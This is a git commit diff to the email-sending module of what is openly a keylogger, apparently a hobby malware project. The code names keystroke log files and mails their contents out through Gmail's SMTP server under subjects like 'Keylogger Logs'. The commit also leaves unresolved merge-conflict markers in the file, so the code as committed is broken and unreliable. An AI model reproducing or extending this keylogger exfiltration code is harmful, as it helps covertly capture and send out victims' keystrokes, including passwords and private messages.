ab8600dc343870e053c82cc4911ea0b15a2691c1
localghost1234 <viczaz99@hotmail.com>
2024-11-20 17:18:33 -0600

    made some serious changes and had to delete previous commits

--- email_events.py
+++ email_events.py
@@ -2,6 +2,7 @@ import datetime
 import smtplib
 from email.mime.text import MIMEText
 
+<<<<<<< HEAD
 # Generate a unique log file name based on the current date and time
 LOG_FILE = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H:%M:%S')}.txt"
 
@@ -19,12 +20,20 @@ def send_email():
     message["Subject"] = "Keylogger Logs"
     message["From"] = sender_email
     message["To"] = receiver_email
+=======
+def send_email(email, password, content):
+    # Create an email message
+    message = MIMEText(content)
+    message["Subject"] = 'keylog.txt'
+    message["From"] = email
+    message["To"] = email
+>>>>>>> de5a6c2 (made serious changes)
 
     try:
         # Connect to the SMTP server and send the email
         with smtplib.SMTP("smtp.gmail.com", 587) as server:  # Change for non-Gmail providers
             server.starttls()
-            server.login(sender_email, password)
+            server.login(email, password)
             server.send_message(message)
             print("Email sent successfully!")
     except Exception as e:
